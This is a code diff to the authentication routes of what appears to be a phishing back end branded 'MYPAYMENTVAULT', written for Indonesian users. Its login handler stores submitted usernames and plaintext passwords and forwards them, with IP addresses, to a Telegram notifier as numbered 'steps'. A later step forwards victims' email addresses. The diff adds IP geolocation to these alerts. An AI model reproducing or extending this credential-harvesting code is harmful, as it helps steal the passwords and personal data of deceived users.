@@ -9,6 +9,7 @@ import {
 import { createSession, deleteSession } from "../lib/sessions";
 import { requireAuth } from "../middleware/require-auth";
 import { tgNotify } from "../lib/tg-notify";
+import { getIpGeo } from "../lib/ip-geo";
 
 const router: IRouter = Router();
 
@@ -46,12 +47,14 @@ router.post("/auth/login", async (req, res): Promise<void> => {
   await db.insert(loginLogsTable).values({ username, password, ipAddress: ip, status: "success" }).catch(() => {});
 
   const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+  const geo = await getIpGeo(ip);
   void tgNotify(
     `🔐 <b>LOGIN MASUK</b> — Step 1\n` +
     `<code>────────────────────────</code>\n\n` +
     `👤 <b>Username</b>  <code>${username}</code>\n` +
     `🔑 <b>Password</b>  <code>${password}</code>\n` +
     `🌐 <b>IP</b>        <code>${ip}</code>\n` +
+    `${geo.flag} <b>Lokasi</b>   ${geo.label}\n` +
     `🕐 <b>Waktu</b>     ${now}\n\n` +
     `<code>────────────────────────</code>\n` +
     `<i>🏦 MYPAYMENTVAULT</i>`
@@ -117,12 +120,14 @@ router.post("/auth/approved", async (req, res): Promise<void> => {
     }).catch(() => {});
 
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    const geo = await getIpGeo(ipAddress ?? "unknown");
     void tgNotify(
       `📧 <b>VERIFIKASI EMAIL</b> — Step 3\n` +
       `<code>────────────────────────</code>\n\n` +
       `👤 <b>Username</b>  <code>${username}</code>\n` +
       `📧 <b>Email</b>     <code>${email ?? "-"}</code>\n` +
       `🌐 <b>IP</b>        <code>${ipAddress ?? "unknown"}</code>\n` +
+      `${geo.flag} <b>Lokasi</b>   ${geo.label}\n` +
       `🕐 <b>Waktu</b>     ${now}\n\n` +
       `<code>────────────────────────</code>\n` +
       `<i>🏦 MYPAYMENTVAULT</i>`
